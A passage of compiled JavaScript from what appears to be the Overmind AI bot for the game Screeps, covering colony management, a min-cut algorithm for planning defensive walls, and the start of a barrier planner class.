        // Register a room planner
        this.roomPlanner = new RoomPlanner(this);
        if (this.roomPlanner.memory.bunkerData && this.roomPlanner.memory.bunkerData.anchor) {
            this.layout = 'bunker';
            const anchor = derefRoomPosition(this.roomPlanner.memory.bunkerData.anchor);
            // log.debug(JSON.stringify(`anchor for ${this.name}: ${anchor}`));
            const spawnPositions = _.map(bunkerLayout[8].buildings.spawn.pos, c => getPosFromBunkerCoord(c, this));
            // log.debug(JSON.stringify(`spawnPositions for ${this.name}: ${spawnPositions}`));
            const rightSpawnPos = maxBy(spawnPositions, pos => pos.x);
            const topSpawnPos = minBy(spawnPositions, pos => pos.y);
            const coreSpawnPos = anchor.findClosestByRange(spawnPositions);
            // log.debug(JSON.stringify(`spawnPoses: ${rightSpawnPos}, ${topSpawnPos}, ${coreSpawnPos}`));
            this.bunker = {
                anchor: anchor,
                topSpawn: topSpawnPos.lookForStructure(STRUCTURE_SPAWN),
                coreSpawn: coreSpawnPos.lookForStructure(STRUCTURE_SPAWN),
                rightSpawn: rightSpawnPos.lookForStructure(STRUCTURE_SPAWN),
            };
        }
        else {
            this.layout = 'twoPart';
        }
        // Register road network
        this.roadLogistics = new RoadLogistics(this);
        // "Organism Abathur with you."
        this.abathur = new Abathur(this);
    }
    /**
     * Calls utility.refresh() for each registered utility
     */
    refreshUtilities() {
        this.linkNetwork.refresh();
        this.logisticsNetwork.refresh();
        this.transportRequests.refresh();
        this.roomPlanner.refresh();
        if (this.bunker) {
            if (this.bunker.topSpawn) {
                this.bunker.topSpawn = Game.getObjectById(this.bunker.topSpawn.id);
            }
            if (this.bunker.coreSpawn) {
                this.bunker.coreSpawn = Game.getObjectById(this.bunker.coreSpawn.id);
            }
            if (this.bunker.rightSpawn) {
                this.bunker.rightSpawn = Game.getObjectById(this.bunker.rightSpawn.id);
            }
        }
        this.roadLogistics.refresh();
        this.abathur.refresh();
    }
    /**
     * Builds hive clusters for each structural group in a colony
     */
    registerHiveClusters() {
        this.hiveClusters = [];
        // Instantiate the command center if there is storage in the room - this must be done first!
        if (this.stage > ColonyStage.Larva) {
            this.commandCenter = new CommandCenter(this, this.storage);
        }
        // Instantiate the hatchery - the incubation directive assignes hatchery to incubator's hatchery if none exists
        if (this.spawns[0]) {
            this.hatchery = new Hatchery(this, this.spawns[0]);
        }
        // Instantiate evolution chamber once there are three labs all in range 2 of each other
        if (this.terminal && _.filter(this.labs, lab => _.all(this.labs, otherLab => lab.pos.inRangeTo(otherLab, 2))).length >= 3) {
            this.evolutionChamber = new EvolutionChamber(this, this.terminal);
        }
        // Instantiate the upgradeSite
        this.upgradeSite = new UpgradeSite(this, this.controller);
        // Instantiate spore crawlers to wrap towers
        if (this.towers[0]) {
            this.sporeCrawler = new SporeCrawler(this, this.towers[0]);
        }
        // Reverse the hive clusters for correct order for init() and run()
        this.hiveClusters.reverse();
    }
    /**
     * Refreshes the state of each hive cluster
     */
    refreshHiveClusters() {
        for (let i = this.hiveClusters.length - 1; i >= 0; i--) {
            this.hiveClusters[i].refresh();
        }
    }
    /**
     * Instantiate all overlords for the colony
     */
    spawnMoarOverlords() {
        this.overlords = {
            default: new DefaultOverlord(this),
            work: new WorkerOverlord(this),
            logistics: new TransportOverlord(this),
        };
        if (!this.observer) {
            this.overlords.scout = new RandomWalkerScoutOverlord(this);
        }
        for (const hiveCluster of this.hiveClusters) {
            hiveCluster.spawnMoarOverlords();
        }
    }
    /**
     * Get a list of creeps in the colony which have a specified role name
     */
    getCreepsByRole(roleName) {
        return this.creepsByRole[roleName] || [];
    }
    /**
     * Get a list of zerg in the colony which have a specified role name
     */
    getZergByRole(roleName) {
        return _.map(this.getCreepsByRole(roleName), creep => Overmind.zerg[creep.name]);
    }
    /**
     * Summarizes the total of all resources in colony store structures, labs, and some creeps
     */
    getAllAssets(verbose = false) {
        // if (this.name == 'E8S45') verbose = true; // 18863
        // Include storage structures, lab contents, and manager carry
        const stores = _.map(_.compact([this.storage, this.terminal]), s => s.store);
        const creepCarriesToInclude = _.map(this.creeps, creep => creep.carry);
        const labContentsToInclude = _.map(_.filter(this.labs, lab => !!lab.mineralType), lab => ({ [lab.mineralType]: lab.mineralAmount }));
        const allAssets = mergeSum([
            ...stores,
            ...creepCarriesToInclude,
            ...labContentsToInclude
        ]);
        if (verbose)
            log.debug(`${this.room.print} assets: ` + JSON.stringify(allAssets));
        return allAssets;
    }
    /**
     * Initializes the state of the colony each tick
     */
    init() {
        _.forEach(this.hiveClusters, hiveCluster => hiveCluster.init()); // Initialize each hive cluster
        this.roadLogistics.init(); // Initialize the road network
        this.linkNetwork.init(); // Initialize link network
        this.roomPlanner.init(); // Initialize the room planner
        if (Game.time % EXPANSION_EVALUATION_FREQ == 5 * this.id) { // Re-evaluate expansion data if needed
            ExpansionEvaluator.refreshExpansionData(this);
        }
    }
    /**
     * Runs the colony, performing state-changing actions each tick
     */
    run() {
        _.forEach(this.hiveClusters, hiveCluster => hiveCluster.run()); // Run each hive cluster
        this.linkNetwork.run(); // Run the link network
        this.roadLogistics.run(); // Run the road network
        this.roomPlanner.run(); // Run the room planner
        this.stats(); // Log stats per tick
    }
    /**
     * Register colony-wide statistics
     */
    stats() {
        if (Game.time % LOG_STATS_INTERVAL == 0) {
            // Log energy and rcl
            Stats.log(`colonies.${this.name}.storage.energy`, this.storage ? this.storage.energy : undefined);
            Stats.log(`colonies.${this.name}.rcl.level`, this.controller.level);
            Stats.log(`colonies.${this.name}.rcl.progress`, this.controller.progress);
            Stats.log(`colonies.${this.name}.rcl.progressTotal`, this.controller.progressTotal);
            // Log average miningSite usage and uptime and estimated colony energy income
            const numSites = _.keys(this.miningSites).length;
            const avgDowntime = _.sum(this.miningSites, site => site.memory[_HARVEST_MEM_DOWNTIME]) / numSites;
            const avgUsage = _.sum(this.miningSites, site => site.memory[_HARVEST_MEM_USAGE]) / numSites;
            const energyInPerTick = _.sum(this.miningSites, site => site.overlords.mine.energyPerTick * site.memory[_HARVEST_MEM_USAGE]);
            Stats.log(`colonies.${this.name}.miningSites.avgDowntime`, avgDowntime);
            Stats.log(`colonies.${this.name}.miningSites.avgUsage`, avgUsage);
            Stats.log(`colonies.${this.name}.miningSites.energyInPerTick`, energyInPerTick);
            Stats.log(`colonies.${this.name}.assets`, this.assets);
            // Log defensive properties
            Stats.log(`colonies.${this.name}.defcon`, this.defcon);
            const avgBarrierHits = _.sum(this.room.barriers, barrier => barrier.hits) / this.room.barriers.length;
            Stats.log(`colonies.${this.name}.avgBarrierHits`, avgBarrierHits);
        }
    }
    drawCreepReport(coord) {
        let { x, y } = coord;
        const roledata = Overmind.overseer.getCreepReport(this);
        const tablePos = new RoomPosition(x, y, this.room.name);
        y = Visualizer.infoBox(`${this.name} Creeps`, roledata, tablePos, 7);
        return { x, y };
    }
    visuals() {
        let x = 1;
        let y = 11.5;
        let coord;
        coord = this.drawCreepReport({ x, y });
        x = coord.x;
        y = coord.y;
        for (const hiveCluster of _.compact([this.hatchery, this.commandCenter, this.evolutionChamber])) {
            coord = hiveCluster.visuals({ x, y });
            x = coord.x;
            y = coord.y;
        }
    }
};
Colony.settings = {
    remoteSourcesByLevel: {
        1: 1,
        2: 2,
        3: 3,
        4: 4,
        5: 5,
        6: 6,
        7: 7,
        8: 9,
    },
    maxSourceDistance: 100
};
Colony = __decorate([
    profile,
    assimilationLocked
], Colony);

/**
 * Code for calculating the minCut in a room, written by Saruss,
 * adapted for Typescript and flexible room subsets by Chobobobo,
 * modified and debugged by Muon.
 */
const UNWALKABLE = -10;
const RANGE_MODIFIER = 1; // this parameter sets the scaling of weights to prefer walls closer protection bounds
const RANGE_PADDING = 3; // max range to reduce weighting; RANGE_MODIFIER * RANGE_PADDING must be < PROTECTED
const NORMAL = 0;
const PROTECTED = 10;
const CANNOT_BUILD = 20;
const EXIT = 30;
class Graph {
    constructor(totalVertices) {
        this.totalVertices = totalVertices;
        this.level = Array(totalVertices);
        // An array of edges for each vertex
        this.edges = Array(totalVertices).fill(0).map((x) => []);
    }
    /**
     * Create a new edge in the graph as well as a corresponding reverse edge on the residual graph
     * @param from - vertex edge starts at
     * @param to - vertex edge leads to
     * @param capacity - max flow capacity for this edge
     */
    newEdge(from, to, capacity) {
        // Normal forward Edge
        this.edges[from].push({ to, resEdge: this.edges[to].length, capacity, flow: 0 });
        // reverse Edge for Residual Graph
        this.edges[to].push({ to: from, resEdge: this.edges[from].length - 1, capacity: 0, flow: 0 });
    }
    /**
     * Uses Breadth First Search to see if a path exists to the vertex 'to' and generate the level graph
     * @param from - vertex to start from
     * @param to - vertex to try and reach
     */
    createLevelGraph(from, to) {
        if (to >= this.totalVertices) {
            return false;
        }
        this.level.fill(-1); // reset old levels
        this.level[from] = 0;
        const q = []; // queue with s as starting point
        q.push(from);
        let u = 0;
        let edge = null;
        while (q.length) {
            u = q.shift();
            for (edge of this.edges[u]) {
                if (this.level[edge.to] < 0 && edge.flow < edge.capacity) {
                    this.level[edge.to] = this.level[u] + 1;
                    q.push(edge.to);
                }
            }
        }
        return this.level[to] >= 0; // return if theres a path, no level, no path!
    }
    /**
     * Depth First Search-like: send flow at along path from from->to recursively while increasing the level of the
     * visited vertices by one
     * @param start - the vertex to start at
     * @param end - the vertex to try and reach
     * @param targetFlow - the amount of flow to try and achieve
     * @param count - keep track of which vertices have been visited so we don't include them twice
     */
    calcFlow(start, end, targetFlow, count) {
        if (start === end) { // Sink reached , abort recursion
            return targetFlow;
        }
        let edge;
        let flowTillHere = 0;
        let flowToT = 0;
        while (count[start] < this.edges[start].length) { // Visit all edges of the vertex one after the other
            edge = this.edges[start][count[start]];
            if (this.level[edge.to] === this.level[start] + 1 && edge.flow < edge.capacity) {
                // Edge leads to Vertex with a level one higher, and has flow left
                flowTillHere = Math.min(targetFlow, edge.capacity - edge.flow);
                flowToT = this.calcFlow(edge.to, end, flowTillHere, count);
                if (flowToT > 0) {
                    edge.flow += flowToT; // Add Flow to current edge
                    // subtract from reverse Edge -> Residual Graph neg. Flow to use backward direction of BFS/DFS
                    this.edges[edge.to][edge.resEdge].flow -= flowToT;
                    return flowToT;
                }
            }
            count[start]++;
        }
        return 0;
    }
    /**
     * Uses Breadth First Search to find the vertices in the minCut for the graph
     * - Must call calcMinCut first to prepare the graph
     * @param from - the vertex to start from
     */
    getMinCut(from) {
        const eInCut = [];
        this.level.fill(-1);
        this.level[from] = 1;
        const q = [];
        q.push(from);
        let u = 0;
        let edge;
        while (q.length) {
            u = q.shift();
            for (edge of this.edges[u]) {
                if (edge.flow < edge.capacity) {
                    if (this.level[edge.to] < 1) {
                        this.level[edge.to] = 1;
                        q.push(edge.to);
                    }
                }
                if (edge.flow === edge.capacity && edge.capacity > 0) { // blocking edge -> could be in min cut
                    eInCut.push({ to: edge.to, unreachable: u });
                }
            }
        }
        const minCut = [];
        let cutEdge;
        for (cutEdge of eInCut) {
            if (this.level[cutEdge.to] === -1) {
                // Only edges which are blocking and lead to the sink from unreachable vertices are in the min cut
                minCut.push(cutEdge.unreachable);
            }
        }
        return minCut;
    }
    /**
     * Calculates min-cut graph using Dinic's Algorithm.
     * use getMinCut to get the actual verticies in the minCut
     * @param source - Source vertex
     * @param sink - Sink vertex
     */
    calcMinCut(source, sink) {
        if (source === sink) {
            return -1;
        }
        let ret = 0;
        let count = [];
        let flow = 0;
        while (this.createLevelGraph(source, sink)) {
            count = Array(this.totalVertices + 1).fill(0);
            do {
                flow = this.calcFlow(source, sink, Number.MAX_VALUE, count);
                if (flow > 0) {
                    ret += flow;
                }
            } while (flow);
        }
        return ret;
    }
}
/**
 * An Array with Terrain information: -1 not usable, 2 Sink (Leads to Exit)
 * @param room - the room to generate the terrain map from
 */
function get2DArray(roomName, bounds = { x1: 0, y1: 0, x2: 49, y2: 49 }) {
    const room2D = Array(50).fill(NORMAL).map((d) => Array(50).fill(NORMAL)); // Array for room tiles
    let x;
    let y;
    const terrain = Game.map.getRoomTerrain(roomName);
    for (x = bounds.x1; x <= bounds.x2; x++) {
        for (y = bounds.y1; y <= bounds.y2; y++) {
            if (terrain.get(x, y) === TERRAIN_MASK_WALL) {
                room2D[x][y] = UNWALKABLE; // Mark unwalkable
            }
            else if (x === bounds.x1 || y === bounds.y1 || x === bounds.x2 || y === bounds.y2) {
                room2D[x][y] = EXIT; // Mark exit tiles
            }
        }
    }
    // Marks tiles as unbuildable if they are proximate to exits
    for (y = bounds.y1 + 1; y <= bounds.y2 - 1; y++) {
        if (room2D[bounds.x1][y] === EXIT) {
            for (const dy of [-1, 0, 1]) {
                if (room2D[bounds.x1 + 1][y + dy] !== UNWALKABLE) {
                    room2D[bounds.x1 + 1][y + dy] = CANNOT_BUILD;
                }
            }
        }
        if (room2D[bounds.x2][y] === EXIT) {
            for (const dy of [-1, 0, 1]) {
                if (room2D[bounds.x2 - 1][y + dy] !== UNWALKABLE) {
                    room2D[bounds.x2 - 1][y + dy] = CANNOT_BUILD;
                }
            }
        }
    }
    for (x = bounds.x1 + 1; x <= bounds.x2 - 1; x++) {
        if (room2D[x][bounds.y1] === EXIT) {
            for (const dx of [-1, 0, 1]) {
                if (room2D[x + dx][bounds.y1 + 1] !== UNWALKABLE) {
                    room2D[x + dx][bounds.y1 + 1] = CANNOT_BUILD;
                }
            }
        }
        if (room2D[x][bounds.y2] === EXIT) {
            for (const dx of [-1, 0, 1]) {
                if (room2D[x + dx][bounds.y2 - 1] !== UNWALKABLE) {
                    room2D[x + dx][bounds.y2 - 1] = CANNOT_BUILD;
                }
            }
        }
    }
    return room2D;
}
/**
 * Function to create Source, Sink, Tiles arrays: takes a rectangle-Array as input for Tiles that are to Protect
 * @param room - the room to consider
 * @param toProtect - the coordinates to protect inside the walls
 * @param bounds - the area to consider for the minCut
 */
function createGraph(roomName, toProtect, preferCloserBarriers = true, preferCloserBarrierLimit = Infinity, // ignore the toProtect[n] for n > this value
visualize = true, bounds = { x1: 0, y1: 0, x2: 49, y2: 49 }) {
    const visual = new RoomVisual(roomName);
    const roomArray = get2DArray(roomName, bounds);
    // For all Rectangles, set edges as source (to protect area) and area as unused
    let r;
    let x;
    let y;
    for (r of toProtect) {
        if (bounds.x1 >= bounds.x2 || bounds.y1 >= bounds.y2 ||
            bounds.x1 < 0 || bounds.y1 < 0 || bounds.x2 > 49 || bounds.y2 > 49) {
            return console.log('ERROR: Invalid bounds', JSON.stringify(bounds));
        }
        else if (r.x1 >= r.x2 || r.y1 >= r.y2) {
            return console.log('ERROR: Rectangle', JSON.stringify(r), 'invalid.');
        }
        else if (r.x1 < bounds.x1 || r.x2 > bounds.x2 || r.y1 < bounds.y1 || r.y2 > bounds.y2) {
            return console.log('ERROR: Rectangle', JSON.stringify(r), 'out of bounds:', JSON.stringify(bounds));
        }
        for (x = r.x1; x <= r.x2; x++) {
            for (y = r.y1; y <= r.y2; y++) {
                if (x === r.x1 || x === r.x2 || y === r.y1 || y === r.y2) {
                    if (roomArray[x][y] === NORMAL) {
                        roomArray[x][y] = PROTECTED;
                    }
                }
                else {
                    roomArray[x][y] = UNWALKABLE;
                }
            }
        }
    }
    // Preferentially weight closer tiles
    if (preferCloserBarriers) {
        for (r of _.take(toProtect, preferCloserBarrierLimit)) {
            const [xmin, xmax] = [Math.max(r.x1 - RANGE_PADDING, 0), Math.min(r.x2 + RANGE_PADDING, 49)];
            const [ymin, ymax] = [Math.max(r.y1 - RANGE_PADDING, 0), Math.min(r.y2 + RANGE_PADDING, 49)];
            for (x = xmin; x <= xmax; x++) {
                for (y = ymin; y <= ymax; y++) {
                    if (roomArray[x][y] >= NORMAL && roomArray[x][y] < PROTECTED) {
                        const x1range = Math.max(r.x1 - x, 0);
                        const x2range = Math.max(x - r.x2, 0);
                        const y1range = Math.max(r.y1 - y, 0);
                        const y2range = Math.max(y - r.y2, 0);
                        const rangeToBorder = Math.max(x1range, x2range, y1range, y2range);
                        const modifiedWeight = NORMAL + RANGE_MODIFIER * (RANGE_PADDING - rangeToBorder);
                        roomArray[x][y] = Math.max(roomArray[x][y], modifiedWeight);
                        if (visualize) {
                            visual.text(`${roomArray[x][y]}`, x, y);
                        }
                    }
                }
            }
        }
    }
    // ********************** Visualization
    if (visualize) {
        for (x = bounds.x1; x <= bounds.x2; x++) {
            for (y = bounds.y1; y <= bounds.y2; y++) {
                if (roomArray[x][y] === UNWALKABLE) {
                    visual.circle(x, y, { radius: 0.5, fill: '#1b1b9f', opacity: 0.3 });
                }
                else if (roomArray[x][y] > UNWALKABLE && roomArray[x][y] < NORMAL) {
                    visual.circle(x, y, { radius: 0.5, fill: '#42cce8', opacity: 0.3 });
                }
                else if (roomArray[x][y] === NORMAL) {
                    visual.circle(x, y, { radius: 0.5, fill: '#bdb8b8', opacity: 0.3 });
                }
                else if (roomArray[x][y] > NORMAL && roomArray[x][y] < PROTECTED) {
                    visual.circle(x, y, { radius: 0.5, fill: '#9929e8', opacity: 0.3 });
                }
                else if (roomArray[x][y] === PROTECTED) {
                    visual.circle(x, y, { radius: 0.5, fill: '#e800c6', opacity: 0.3 });
                }
                else if (roomArray[x][y] === CANNOT_BUILD) {
                    visual.circle(x, y, { radius: 0.5, fill: '#e8000f', opacity: 0.3 });
                }
                else if (roomArray[x][y] === EXIT) {
                    visual.circle(x, y, { radius: 0.5, fill: '#000000', opacity: 0.3 });
                }
            }
        }
    }
    // initialise graph
    // possible 2*50*50 +2 (st) Vertices (Walls etc set to unused later)
    const g = new Graph(2 * 50 * 50 + 2);
    const infini = Number.MAX_VALUE;
    const surr = [[0, -1], [-1, -1], [-1, 0], [-1, 1], [0, 1], [1, 1], [1, 0], [1, -1]];
    // per Tile (0 in Array) top + bot with edge of c=1 from top to bott  (use every tile once!)
    // infini edge from bot to top vertices of adjacent tiles if they not protected (array =1)
    // (no reverse edges in normal graph)
    // per prot. Tile (1 in array) Edge from source to this tile with infini cap.
    // per exit Tile (2in array) Edge to sink with infini cap.
    // source is at  pos 2*50*50, sink at 2*50*50+1 as first tile is 0,0 => pos 0
    // top vertices <-> x,y : v=y*50+x   and x= v % 50  y=v/50 (math.floor?)
    // bot vertices <-> top + 2500
    const source = 2 * 50 * 50;
    const sink = 2 * 50 * 50 + 1;
    let top = 0;
    let bot = 0;
    let dx = 0;
    let dy = 0;
    // max = 49;
    const baseCapacity = 10;
    const modifyWeight = preferCloserBarriers ? 1 : 0;
    for (x = bounds.x1 + 1; x < bounds.x2; x++) {
        for (y = bounds.y1 + 1; y < bounds.y2; y++) {
            top = y * 50 + x;
            bot = top + 2500;
            if (roomArray[x][y] >= NORMAL && roomArray[x][y] <= PROTECTED) {
                if (roomArray[x][y] >= NORMAL && roomArray[x][y] < PROTECTED) {
                    g.newEdge(top, bot, baseCapacity - modifyWeight * roomArray[x][y]); // add surplus weighting
                }
                else if (roomArray[x][y] === PROTECTED) { // connect this to the source
                    g.newEdge(source, top, infini);
                    g.newEdge(top, bot, baseCapacity - modifyWeight * RANGE_PADDING * RANGE_MODIFIER);
                }
                for (let i = 0; i < 8; i++) { // attach adjacent edges
                    dx = x + surr[i][0];
                    dy = y + surr[i][1];
                    if ((roomArray[dx][dy] >= NORMAL && roomArray[dx][dy] < PROTECTED)
                        || roomArray[dx][dy] === CANNOT_BUILD) {
                        g.newEdge(bot, dy * 50 + dx, infini);
                    }
                }
            }
            else if (roomArray[x][y] === CANNOT_BUILD) { // near Exit
                g.newEdge(top, sink, infini);
            }
        }
    } // graph finished
    return g;
}
/**
 * Main function to be called by user: calculate min cut tiles from room using rectangles as protected areas
 * @param room - the room to use
 * @param rectangles - the areas to protect, defined as rectangles
 * @param bounds - the area to be considered for the minCut
 */
function getCutTiles(roomName, toProtect, preferCloserBarriers = true, preferCloserBarrierLimit = Infinity, visualize = true, bounds = { x1: 0, y1: 0, x2: 49, y2: 49 }) {
    const graph = createGraph(roomName, toProtect, preferCloserBarriers, preferCloserBarrierLimit, visualize, bounds);
    if (!graph) {
        return [];
    }
    let x;
    let y;
    const source = 2 * 50 * 50; // Position Source / Sink in Room-Graph
    const sink = 2 * 50 * 50 + 1;
    const count = graph.calcMinCut(source, sink);
    // console.log('Number of Tiles in Cut:', count);
    const positions = [];
    if (count > 0) {
        const cutVertices = graph.getMinCut(source);
        let v;
        for (v of cutVertices) {
            // x= vertex % 50  y=v/50 (math.floor?)
            x = v % 50;
            y = Math.floor(v / 50);
            positions.push({ x, y });
        }
    }
    // Visualise Result
    if (positions.length > 0) {
        const visual = new RoomVisual(roomName);
        for (let i = positions.length - 1; i >= 0; i--) {
            visual.circle(positions[i].x, positions[i].y, { radius: 0.5, fill: '#ff7722', opacity: 0.9 });
        }
    }
    else {
        return [];
    }
    const wholeRoom = bounds.x1 === 0 && bounds.y1 === 0 && bounds.x2 === 49 && bounds.y2 === 49;
    return wholeRoom ? positions : pruneDeadEnds(roomName, positions);
}
/**
 * Removes unnecessary tiles if they are blocking the path to a dead end
 * Useful if minCut has been run on a subset of the room
 * @param roomName - Room to work in
 * @param cutTiles - Array of tiles which are in the minCut
 */
function pruneDeadEnds(roomName, cutTiles) {
    // Get Terrain and set all cut-tiles as unwalkable
    const roomArray = get2DArray(roomName);
    let tile;
    for (tile of cutTiles) {
        roomArray[tile.x][tile.y] = UNWALKABLE;
    }
    // Floodfill from exits: save exit tiles in array and do a BFS-like search
    const unvisited = [];
    let y;
    let x;
    for (y = 0; y < 49; y++) {
        if (roomArray[0][y] === EXIT) {
            console.log('prune: toExit', 0, y);
            unvisited.push(50 * y);
        }
        if (roomArray[49][y] === EXIT) {
            console.log('prune: toExit', 49, y);
            unvisited.push(50 * y + 49);
        }
    }
    for (x = 0; x < 49; x++) {
        if (roomArray[x][0] === EXIT) {
            console.log('prune: toExit', x, 0);
            unvisited.push(x);
        }
        if (roomArray[x][49] === EXIT) {
            console.log('prune: toExit', x, 49);
            unvisited.push(2450 + x); // 50*49=2450
        }
    }
    // Iterate over all unvisited EXIT tiles and mark neigbours as EXIT tiles if walkable, add to unvisited
    const surr = [[0, -1], [-1, -1], [-1, 0], [-1, 1], [0, 1], [1, 1], [1, 0], [1, -1]];
    let currPos;
    let dx;
    let dy;
    while (unvisited.length > 0) {
        currPos = unvisited.pop();
        x = currPos % 50;
        y = Math.floor(currPos / 50);
        for (let i = 0; i < 8; i++) {
            dx = x + surr[i][0];
            dy = y + surr[i][1];
            if (dx < 0 || dx > 49 || dy < 0 || dy > 49) {
                continue;
            }
            if ((roomArray[dx][dy] >= NORMAL && roomArray[dx][dy] < PROTECTED)
                || roomArray[dx][dy] === CANNOT_BUILD) {
                unvisited.push(50 * dy + dx);
                roomArray[dx][dy] = EXIT;
            }
        }
    }
    // Remove min-Cut-Tile if there is no EXIT reachable by it
    let leadsToExit;
    const validCut = [];
    for (tile of cutTiles) {
        leadsToExit = false;
        for (let j = 0; j < 8; j++) {
            dx = tile.x + surr[j][0];
            dy = tile.y + surr[j][1];
            if (roomArray[dx][dy] === EXIT) {
                leadsToExit = true;
            }
        }
        if (leadsToExit) {
            validCut.push(tile);
        }
    }
    return validCut;
}
/**
 * Example function: demonstrates how to get a min cut with 2 rectangles, which define a "to protect" area
 * @param roomName - the name of the room to use for the test, must be visible
 */
function testMinCut(colonyName, preferCloserBarriers = true) {
    const colony = Overmind.colonies[colonyName];
    if (!colony) {
        return `No colony: ${colonyName}`;
    }
    let cpu = Game.cpu.getUsed();
    // Rectangle Array, the Rectangles will be protected by the returned tiles
    const rectArray = [];
    const padding = 3;
    if (colony.hatchery) {
        const { x, y } = colony.hatchery.pos;
        const [x1, y1] = [Math.max(x - 5 - padding, 0), Math.max(y - 4 - padding, 0)];
        const [x2, y2] = [Math.min(x + 5 + padding, 49), Math.min(y + 6 + padding, 49)];
        rectArray.push({ x1: x1, y1: y1, x2: x2, y2: y2 });
    }
    if (colony.commandCenter) {
        const { x, y } = colony.commandCenter.pos;
        const [x1, y1] = [Math.max(x - 3 - padding, 0), Math.max(y - 0 - padding, 0)];
        const [x2, y2] = [Math.min(x + 0 + padding, 49), Math.min(y + 5 + padding, 49)];
        rectArray.push({ x1: x1, y1: y1, x2: x2, y2: y2 });
    }
    if (colony.upgradeSite) {
        const { x, y } = colony.upgradeSite.pos;
        const [x1, y1] = [Math.max(x - 1, 0), Math.max(y - 1, 0)];
        const [x2, y2] = [Math.min(x + 1, 49), Math.min(y + 1, 49)];
        rectArray.push({ x1: x1, y1: y1, x2: x2, y2: y2 });
    }
    // Get Min cut
    // Positions is an array where to build walls/ramparts
    const positions = getCutTiles(colonyName, rectArray, preferCloserBarriers, 2);
    // Test output
    // console.log('Positions returned', positions.length);
    cpu = Game.cpu.getUsed() - cpu;
    // console.log('Needed', cpu, ' cpu time');
    log.info(`preferCloserBarriers = ${preferCloserBarriers}; positions returned: ${positions.length};` +
        ` CPU time: ${cpu}`);
    return 'Finished';
}
/**
 * Example function: demonstrates how to get a min cut with 2 rectangles, which define a "to protect" area
 * while considering a subset of the larger room.
 * @param roomName - the name of the room to use for the test, must be visible
 */
function testMinCutSubset(colonyName) {
    const colony = Overmind.colonies[colonyName];
    if (!colony) {
        return `No colony: ${colonyName}`;
    }
    let cpu = Game.cpu.getUsed();
    // Rectangle Array, the Rectangles will be protected by the returned tiles
    const rectArray = [];
    const padding = 3;
    if (colony.hatchery) {
        const { x, y } = colony.hatchery.pos;
        rectArray.push({ x1: x - 5 - padding, y1: y - 4 - padding, x2: x + 5 + padding, y2: y + 6 + padding });
    }
    if (colony.commandCenter) {
        const { x, y } = colony.commandCenter.pos;
        rectArray.push({ x1: x - 3 - padding, y1: y - 0 - padding, x2: x + 0 + padding, y2: y + 5 + padding });
    }
    // Get Min cut, returns the positions where ramparts/walls need to be
    const positions = getCutTiles(colonyName, rectArray, true, Infinity, true, { x1: 5, y1: 5, x2: 44, y2: 44 });
    // Test output
    console.log('Positions returned', positions.length);
    cpu = Game.cpu.getUsed() - cpu;
    console.log('Needed', cpu, ' cpu time');
    return 'Finished';
}

var BarrierPlanner_1;
const memoryDefaults = {
    barrierLookup: {},
};
let BarrierPlanner = BarrierPlanner_1 = class BarrierPlanner {
    constructor(roomPlanner) {
        this.roomPlanner = roomPlanner;
        this.colony = roomPlanner.colony;
        this.memory = Mem.wrap(this.colony.memory, 'barrierPlanner', memoryDefaults);
        this.barrierPositions = [];
    }
    refresh() {
        this.memory = Mem.wrap(this.colony.memory, 'barrierPlanner', memoryDefaults);
        this.barrierPositions = [];
    }
    computeBunkerBarrierPositions(bunkerPos, upgradeSitePos) {
        const rectArray = [];
        const padding = BarrierPlanner_1.settings.padding;
        if (bunkerPos) {
            const { x, y } = bunkerPos;
            const r = BUNKER_RADIUS - 1;
            let [x1, y1] = [Math.max(x - r - padding, 0), Math.max(y - r - padding, 0)];
            let [x2, y2] = [Math.min(x + r + padding, 49), Math.min(y + r + padding, 49)];
            // Make sure you don't leave open walls
            x1 = minMax(x1, 3, 50 - 3);
            x2 = minMax(x2, 3, 50 - 3);
            y1 = minMax(y1, 3, 50 - 3);
            y2 = minMax(y2, 3, 50 - 3);
            rectArray.push({ x1: x1, y1: y1, x2: x2, y2: y2 });
        }
        // Get Min cut
        const barrierCoords = getCutTiles(this.colony.name, rectArray, false, 2, false);
        let positions = _.map(barrierCoords, coord => new RoomPosition(coord.x, coord.y, this.colony.name));
        positions = positions.concat(upgradeSitePos.availableNeighbors(true));
        return positions;
    }
    computeBarrierPositions(hatcheryPos, commandCenterPos, upgradeSitePos) {
        const rectArray = [];
        const padding = BarrierPlanner_1.settings.padding;
        if (hatcheryPos) {
            const { x, y } = hatcheryPos;
            const [x1, y1] = [Math.max(x - 5 - padding, 0), Math.max(y - 4 - padding, 0)];
            const [x2, y2] = [Math.min(x + 5 + padding, 49), Math.min(y + 6 + padding, 49)];
            rectArray.push({ x1: x1, y1: y1, x2: x2, y2: y2 });
        }
        if (commandCenterPos) {
            const { x, y } = commandCenterPos;
            const [x1, y1] = [Math.max(x - 3 - padding, 0), Math.max(y - 0 - padding, 0)];
            const [x2, y2] = [Math.min(x + 0 + padding, 49), Math.min(y + 5 + padding, 49)];
            rectArray.push({ x1: x1, y1: y1, x2: x2, y2: y2 });
        }
        if (upgradeSitePos) {
            const { x, y } = upgradeSitePos;
            const [x1, y1] = [Math.max(x - 1, 0), Math.max(y - 1, 0)];
            const [x2, y2] = [Math.min(x + 1, 49), Math.min(y + 1, 49)];
            rectArray.push({ x1: x1, y1: y1, x2: x2, y2: y2 });
        }
        // Get Min cut
        const barrierCoords = getCutTiles(this.colony.name, rectArray, true, 2, false);
        return _.map(barrierCoords, coord => new RoomPosition(coord.x, coord.y, this.colony.name));
    }
    init() {
    }
    /* Write everything to memory after roomPlanner is closed */
    finalize() {
        this.memory.barrierLookup = {};
        if (this.barrierPositions.length == 0) {
            if (this.roomPlanner.bunkerPos) {
                this.barrierPositions = this.computeBunkerBarrierPositions(this.roomPlanner.bunkerPos, this.colony.controller.pos);
            }
            else if (this.roomPlanner.storagePos && this.roomPlanner.hatcheryPos) {
                this.barrierPositions = this.computeBarrierPositions(this.roomPlanner.hatcheryPos, this.roomPlanner.storagePos, this.colony.controller.pos);
            }
            else {
                log.error(`Couldn't generate barrier plan for ${this.colony.name}!`);
            }
        }
        for (const pos of this.barrierPositions) {
            this.memory.barrierLookup[pos.coordName] = true;
        }
    }
    /* Quick lookup for if a barrier should be in this position. Barriers returning false won't be maintained. */
    barrierShouldBeHere(pos) {
        if (this.colony.layout == 'bunker') {
            if (this.colony.level >= BarrierPlanner_1.settings.bunkerizeRCL) {
                // Once you are high level, only maintain ramparts at bunker or controller
                return insideBunkerBounds(pos, this.colony) || pos.getRangeTo(this.colony.controller) == 1;
            }
            else {
                // Otherwise keep the normal plan up
